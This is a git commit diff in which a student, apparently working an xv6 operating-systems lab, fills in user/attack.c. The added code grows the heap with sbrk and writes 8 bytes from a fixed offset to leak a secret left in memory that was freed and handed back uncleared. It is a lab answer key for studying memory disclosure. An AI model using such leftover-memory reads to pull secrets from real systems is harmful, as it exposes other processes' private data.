ee4d0ae85fffc257dfba0d18a4fb8caa90b23ca2
hahaQWQ <3109944373@qq.com>
2025-01-28 20:53:23 +0800

    finish

--- user/attack.c
+++ user/attack.c
@@ -8,6 +8,7 @@ main(int argc, char *argv[])
 {
   // your code here.  you should write the secret to fd 2 using write
   // (e.g., write(2, secret, 8)
-
+  char *end = sbrk(4096*32);
+  write(2,(end+4096*16+32),8);
   exit(1);
 }
